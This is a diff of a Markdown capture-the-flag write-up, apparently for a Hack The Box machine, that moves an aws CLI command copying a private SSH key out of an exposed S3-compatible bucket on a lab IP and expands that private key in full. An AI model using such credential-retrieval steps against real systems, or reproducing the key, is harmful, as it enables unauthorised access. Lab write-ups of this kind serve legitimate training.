@@ -551,7 +551,6 @@ Inside we find:
 
 ```
 .ssh/authorized_keys
-.ssh/id_ed25519
 ```
 
 ![Alt text](../assets/htb/facts/20.png)
@@ -571,27 +570,35 @@ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFfgjpLS4XE0OvROzUd8rw/pm0V+UJk1X3kDoy/9eNpt
 
 Then we discover the real prize:
 
-```bash
-aws --endpoint-url http://10.129.41.13:54321 s3 cp s3://internal/.ssh/id_ed25519 .
-```
-
 ```
 id_ed25519 (PRIVATE KEY)
+```
+
+We bring it locally:
+
+```bash
+aws --endpoint-url http://10.129.41.13:54321 s3 cp s3://internal/.ssh/id_ed25519 .
 ```
 
 Full key:
 
 ```
 -----BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0...
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAnJGM9m7
+mVVXcJn9v7gZ3jAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIFfgjpLS4XE0OvRO
+zUd8rw/pm0V+UJk1X3kDoy/9eNptAAAAoKA+oDRhR4gFkCx6U/sqlWaWxnwrXiRGXPiMd1
+Qu+nYYMnIxsC5UweozE8KZdgV8vISj8MdJkgiWCvxpAkl+7eO+yF6lPx+RoeLal9peHoXh
+FwZoPe449fa/4SFSgkEwbdoL45kWOT0NrY0U6GcP+KZWBNaPR7WkwubvwsgIPTe8GNXqnz
+keexsrsgCdg2hqHjiumvZhx/cLvJoCDB3GVzg=
 -----END OPENSSH PRIVATE KEY-----
+
 ```
 
 This is the actual foothold.
 
 ---
 
-## SSH Access
+## 9. SSH Access
 
 We fix permissions:
 
